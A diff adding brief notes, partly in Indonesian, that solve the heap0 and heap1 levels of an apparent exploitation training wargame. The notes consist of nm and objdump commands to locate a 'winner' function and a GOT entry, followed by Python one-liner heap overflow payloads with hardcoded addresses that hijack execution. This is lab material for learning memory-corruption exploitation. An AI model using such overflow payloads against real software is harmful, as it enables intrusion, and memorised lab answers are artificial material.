@@ -1,0 +1,16 @@
+heap0
+======
+
+nm heap0 | grep winner
+
+./heap0 `python -c 'print "A"*72+"\x64\x84\x04\x08"'`
+
+heap1
+======
+
+nm heap1 | grep winner
+objdump -R heap1 => cari alamat fungsi puts()
+
+buffer -> puts() -> winner()
+
+./heap1 `python -c 'print "A"*20+"\x74\x97\x04\x08"'` `python -c 'print "\x94\x84\x04\x08"'`
